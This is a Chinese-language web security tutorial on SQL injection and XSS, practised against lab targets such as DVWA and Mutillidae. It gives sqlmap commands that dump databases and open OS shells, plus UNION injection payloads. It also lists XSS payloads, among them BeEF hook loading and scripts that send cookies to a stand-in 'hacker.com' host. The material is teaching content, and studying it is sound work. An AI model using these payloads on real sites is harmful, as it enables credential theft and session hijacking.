
<h3 id="GET-方法注入"><a href="#GET-方法注入" class="headerlink" title="GET 方法注入"></a>GET 方法注入</h3><p>先找一个无需登录的靶机 QWASP Mutillidae Ⅱ &gt; OWASP 2013 &gt; A1 - Injection(SQL) &gt; SQLi - Extract Data &gt; User Info(SQL)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.50.129&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;purple&amp;password&#x3D;1234&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot; --batch -p username</span><br></pre></td></tr></table></figure>
<img src="sqlmap-nologin.png" alt="sqlmap-nologin" style="zoom:80%;" />

<img src="sqlmap-nologin2.png" alt="sqlmap-nologin2" style="zoom:80%;" />

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动化完成</span></span><br><span class="line">--batch</span><br><span class="line"><span class="comment"># 获得所有数据库</span></span><br><span class="line">--dbs</span><br><span class="line"><span class="comment"># 获得所有用户</span></span><br><span class="line">--users</span><br><span class="line"><span class="comment"># 获得当前用户</span></span><br><span class="line">--current-user</span><br><span class="line"><span class="comment"># 获得当前数据库</span></span><br><span class="line">--current-db</span><br><span class="line"></span><br><span class="line">--level=5 --risk=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得表 -D &quot;database_name&quot; --tables</span></span><br><span class="line">-D wordpress --tables </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得列 -D &quot;database_name&quot; -T &quot;table_name&quot; --columns</span></span><br><span class="line">-D wordpress -T wp_users --columns</span><br><span class="line"></span><br><span class="line">--dump-all</span><br><span class="line"><span class="comment"># 排除</span></span><br><span class="line">--dump-all --exclude-sysdbs</span><br><span class="line"><span class="comment"># crack password</span></span><br><span class="line">-D <span class="string">&quot;database_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> --dump</span><br><span class="line"><span class="comment"># 指定列名</span></span><br><span class="line">-D <span class="string">&quot;database_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> -C <span class="string">&quot;username,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>需要帐号登录的靶机：DVWA </p>
<ul>
<li><p>通过 cookie：早期用户名密码是保存在 cookie 当中，不安全；如今不保存在客户端，而保存在服务器端的 session 当中。服务器会给客户端生成一个 session_id，客户端把 session_id 保存在 cookie 当中，在 session 没有过期之前，客户端持有这个 session_id 都可以无需登录访问页面。</p>
<p>firefox 的插件：Cookiebro / Cookie Quick Manager</p>
<p>Google Chrome:</p>
<img src="cookie.png" alt="cookie" style="zoom:50%;" />

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 要写全网址</span></span><br><span class="line"><span class="comment"># 指定参数 -p</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.50.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit&quot;</span> -p id --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.50.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</span> -p id --batch --cookie=<span class="string">&quot;xxx=xxx;xxx=xxx&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.50.129/dvwa/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</span> -p id --batch --dbms=mysql </span><br></pre></td></tr></table></figure>
<img src="sqlmap-login.png" alt="sqlmap-login" style="zoom:80%;" />

<img src="sqlmap-login2.png" alt="sqlmap-login2" style="zoom:80%;" />

<p>其他数据操作同理</p>
<p><img src="dbs.png"></p>
</li>
</ul>
<h3 id="POST-方法注入"><a href="#POST-方法注入" class="headerlink" title="POST 方法注入"></a>POST 方法注入</h3><p>利用 sqlmap 进行 post 注入的方式有三种：</p>
<ol>
<li>Burpsuite 抓包，然后保存抓取到的内容(提交表单的数据包，含有用户名密码信息)。例如：保存为 post.txt,然后把它放至某个目录下。运行 sqlmap 并使用如下命令：<strong>sqlmap -r post.txt -p id</strong>，这里参数 -r 是让 sqlmap 加载我们的 post 请求 post.txt，-p 指定注入用的参数</li>
<li>自动搜索表单的方式：sqlmap -u “<a href="http://192.168.160.1/sqltest/post.php&quot;">http://192.168.160.1/sqltest/post.php&quot;</a> –forms</li>
<li>指定一个参数的方法：sqlmap -u “<a href="http://xxx.xxx.com/Login.asp&quot;">http://xxx.xxx.com/Login.asp&quot;</a> –data “n=1&amp;p=1”</li>
</ol>
<p>参考资料：</p>
<ul>
<li><a href="https://hackertarget.com/sqlmap-post-request-injection/">https://hackertarget.com/sqlmap-post-request-injection/</a></li>
<li><a href="https://blog.csdn.net/u011781521/article/details/58594941">https://blog.csdn.net/u011781521/article/details/58594941</a></li>
</ul>
<h3 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h3><ol>
<li>猜解当前数据库名</li>
<li>猜解数据库中的表名</li>
<li>猜解表中的字段名</li>
<li>猜解数据</li>
</ol>
<h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 与数据库交互</span><br><span class="line">--sql-shell</span><br><span class="line"># 不是所有命令都有</span><br><span class="line"></span><br><span class="line"># 与操作系统交互</span><br><span class="line">--os-shell</span><br><span class="line"># 对某些网站目录有写权限才可以成功创建os-shell</span><br><span class="line"></span><br><span class="line">--os-cmd&#x3D;ls &#x2F;</span><br></pre></td></tr></table></figure>


<h3 id="综合实例"><a href="#综合实例" class="headerlink" title="综合实例"></a>综合实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 通过Google搜索可能存在注入的页面</span><br><span class="line">   inurl:.php?id&#x3D;</span><br><span class="line">   inurl:.jsp?id&#x3D;</span><br><span class="line">   inurl:.asp?id&#x3D;</span><br><span class="line">   inurl:&#x2F;admin&#x2F;login.php</span><br><span class="line">   inurl:.php?id&#x3D; intitle:xxx</span><br><span class="line">2. 通过百度搜索可能存在注入的页面</span><br><span class="line">   inurl:news.asp?id&#x3D; site:edu.cn</span><br><span class="line">   inurl:news.php?id&#x3D; site:edu.cn</span><br><span class="line">   inurl:news.aspx?id&#x3D; site:edu.cn</span><br></pre></td></tr></table></figure>

<h2 id="dvwa-sql-injection"><a href="#dvwa-sql-injection" class="headerlink" title="dvwa sql injection"></a>dvwa sql injection</h2><ul>
<li><p>medium security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$first</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">        <span class="variable">$last</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>数字型注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库</span><br><span class="line">1 union select 1,database() #</span><br><span class="line"></span><br><span class="line"># 获取数据库中的表</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line"></span><br><span class="line"># 获取表中的字段名</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 #</span><br><span class="line"></span><br><span class="line"># 得到数据</span><br><span class="line">1 union select group_concat(user_id,first_name),group_concat(password) from users #</span><br><span class="line"></span><br><span class="line"># 此处password是密文，需要MD５转换</span><br></pre></td></tr></table></figure>
<ul>
<li>获取表中的字段名：<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code>，会报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39;users\&#39; #&#39; at line 1</code>，是因为<code>mysql_real_escape_string</code>函数是转义了 SQL 语句字符串中的特殊字符，如输入单引号’则处理时会在其前面加上右斜杠\来进行转义，如果语句错误则输出相应的错误信息。其中受影响的字符如下：<code>\x00 \n \r \ &#39; &quot; \x1a</code>。所以更换注入方式，不要用单引号，可以用 16 进制绕过，将 users 变为 0x7573657273</li>
</ul>
</li>
<li><p>high security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$id</span> = stripslashes(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric(<span class="variable">$id</span>))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$num</span> = mysql_numrows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$first</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">            <span class="variable">$last</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>PHP stripslashes()函数的作用是删除由 addslashes() 函数添加的反斜杠；PHP addslashes()函数在预定义字符(<code>&#39; &quot; \</code>)之前添加反斜杠</p>
</li>
<li><p>此时输入单引号’ 页面没有报错，所以证明后台能够处理单引号</p>
</li>
<li><p>在 high security 中，PHP 的 magic_quotes_gpc 被自动设为 on，magic_quotes_gpc 被称为魔术引号，开启它之后，可以对所有的 GET、POST 和 COOKIE 传值的数据自动运行 addslashes() 函数，所以这里才要使用 stripslashes() 函数去除。magic_quotes_gpc 功能在 PHP5.3.0 中已经废弃并且在 5.4.0 中已经移除了，这也是为什么在 DVWA 中一直强调使用 mysql_real_escape_string() 函数进行过滤的原因吧</p>
</li>
<li><p>在执行查询之前，使用了 if 语句进行判断，判断的条件是一个 is_numeric() 函数，即判断用户输入的数据是否是数字型，只要不是数字型就一概报错，则 and、or、select 等语句都无法执行了。最后在具体执行查询时，还要求 $id 是字符型</p>
</li>
</ul>
</li>
</ul>
<h3 id="代码层面防护"><a href="#代码层面防护" class="headerlink" title="代码层面防护"></a>代码层面防护</h3><ul>
<li>对于数字型注入，只要使用 if 语句，并以 is_number() 函数作为判断条件就足以防御了。</li>
<li>对于字符型注入，只要对用于接收用户参数的变量，用 mysql_real_escape_string() 函数进行过滤也就可以了。</li>
</ul>
<p>参考资料：</p>
<ul>
<li><a href="https://blog.51cto.com/yttitan/1720191">https://blog.51cto.com/yttitan/1720191</a></li>
</ul>
<hr>
<h2 id="dvwa-sql-injection-Blind"><a href="#dvwa-sql-injection-Blind" class="headerlink" title="dvwa sql injection(Blind)"></a>dvwa sql injection(Blind)</h2><p>需要换一个靶机</p>
<ul>
<li>low security</li>
<li>medium security</li>
<li>high security</li>
</ul>
<p>参考资料：</p>
<ul>
<li><a href="https://blog.csdn.net/zjw0411/article/details/79714645">https://blog.csdn.net/zjw0411/article/details/79714645</a></li>
<li><a href="https://www.cnblogs.com/bmjoker/p/8797968.html">https://www.cnblogs.com/bmjoker/p/8797968.html</a></li>
<li><a href="https://www.freebuf.com/articles/web/120985.html">https://www.freebuf.com/articles/web/120985.html</a></li>
</ul>
<p>PDO 技术</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results </span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t! </span></span><br><span class="line">            header( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PDO 全名 PHP Data Object(PHP 数据对象)，为 PHP 访问数据库定义了一个轻量级的一致接口，提供了一个数据访问抽象层，即不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。在 bindParam() 方法中，默认绑定的参数类型就是字符串，此处规定为 int 类型。</p>
<hr>
<h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h1><h2 id="XSS-简介"><a href="#XSS-简介" class="headerlink" title="XSS 简介"></a>XSS 简介</h2><blockquote>
<p>跨站脚本(cross site script)为了避免与样式 css 混淆，所以简称为 XSS</p>
<p>是一种经常出现在 web 应用中的计算机安全漏洞，也是 web 中最主流的攻击方式，对客户端进行攻击(挂马)</p>
<p>是指恶意攻击者利用网站没有对用户提交数据进行<u>转义处理</u>或者<u>过滤不足</u>的缺点，进而添加一些代码，嵌入到 web 页面中去，使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式</p>
<p>XSS 攻击的危害：</p>
<ol>
<li>盗取各类用户帐号，如机器登录账号、用户网银账号、各类管理员账号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗取企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其他网站发起攻击</li>
</ol>
</blockquote>
<h2 id="XSS-原理"><a href="#XSS-原理" class="headerlink" title="XSS 原理"></a>XSS 原理</h2><p><img src="xss.png"></p>
<blockquote>
<p>XSS 主要原因：过于信任客户端提交的数据</p>
<p>反射型 XSS 是一种非持久性的攻击，又称为非持久性跨站点脚本攻击，是最常见的。漏洞产生的主要原因是攻击者注入的数据反映在响应中，一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接(即每次攻击需要用户的点击)。指的是恶意攻击者往 Web 页面里面插入恶意代码，当用户浏览该页面的时候，嵌入 Web 里面的代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户主动点击一个链接到目标网站的恶意链接来实施攻击</p>
<p>存储型 XSS(Stored XSS) 又称为持久型跨站点脚本，它一般发生在 XSS 攻击向量(一般指 XSS 攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的 XSS 相比于非持久的 XSS 攻击危害性更大，因为每当用户打开页面、查看内容时，脚本将自动执行</p>
<p>图解：web 服务器的某个网站存在存储型 XSS 漏洞，黑客将恶意代码注入 web 服务器，web 服务器存储在本地，用户访问含有恶意代码的页面，自动执行恶意代码，从而去访问黑客机器上钩，黑客机器用 BeEF 控制用户机器</p>
</blockquote>
<h2 id="构造-XSS-脚本"><a href="#构造-XSS-脚本" class="headerlink" title="构造 XSS 脚本"></a>构造 XSS 脚本</h2><h3 id="常用的-HTML-标签"><a href="#常用的-HTML-标签" class="headerlink" title="常用的 HTML 标签"></a>常用的 HTML 标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span> iframe元素会创建包含另外一个文档的内联框架(即行内框架)</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span> 定义多行的文本输入控件</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span> 向网页中嵌入一幅图像</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> 用于定义客户端脚本，比如JavaScript；script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件；必须的type属性规定脚本的MIME类型；JavaScript的常见应用是图像操作、表单验证以及动态内容更新</span><br></pre></td></tr></table></figure>
<h3 id="常见-JavaScript-方法"><a href="#常见-JavaScript-方法" class="headerlink" title="常见 JavaScript 方法"></a>常见 JavaScript 方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert 显示带有一条指定消息和一个确认按钮的警告框</span><br><span class="line"><span class="built_in">window</span>.location 获得当前页面的地址(URL)，并把浏览器重定向到新的页面</span><br><span class="line">location.href 返回当前显示的文档的完整URL</span><br><span class="line">onload 一张页面或一幅图像完成加载</span><br><span class="line">onsubmit 确认按钮被点击</span><br><span class="line">onerror 在加载文档或图像时发生错误</span><br></pre></td></tr></table></figure>
<h3 id="构造-XSS-脚本-1"><a href="#构造-XSS-脚本-1" class="headerlink" title="构造 XSS 脚本"></a>构造 XSS 脚本</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 弹框警告</span><br><span class="line"># 实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号&#x27;，一旦此脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<span class="tag">&lt;&gt;</span>/&#x27;，可证明这个页面位置存在XS漏洞</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 页面嵌套</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">300</span> <span class="attr">height</span>=<span class="string">300</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"># 隐藏他</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://www.baidu.com</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">border</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 页面重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location=<span class="string">&quot;http://www.baidu/com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 弹框警告并重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;我们的网站已升级，请移步到新的网站&quot;</span>);location.href=<span class="string">&quot;http://www.baidu.com&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"># 结合一些社工的思路，例如通过网站内部私信的方式将其发给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户(克隆网站收集账户)</span><br><span class="line"></span><br><span class="line"># 访问恶意代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xxx/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"># 结合BeEF手机用户的cookie</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 巧用图片标签 - 隐蔽</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 绕开过滤的脚本</span><br><span class="line"># 大小写</span><br><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRipt</span>&gt;</span></span><br><span class="line"># 字符编码 采用URL、Base64等编码 </span><br><span class="line"># 将 javascript:alert(&#x27;xss&#x27;); 转码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span>&quot;</span>&gt;</span>嘿嘿<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 收集用户cookie</span><br><span class="line"># 打开新窗口并且采用本地cookie访问目标网页</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&quot;http://www/hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookies</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>;</span></span><br><span class="line">img.width = 0;</span><br><span class="line">img.height = 0;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="反射型-XSS-XSS-reflected"><a href="#反射型-XSS-XSS-reflected" class="headerlink" title="反射型 XSS (XSS reflected)"></a>反射型 XSS (XSS reflected)</h2><p>搜索框，用户提交恶意代码被执行</p>
<ul>
<li><p>low security</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!array_key_exists (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span 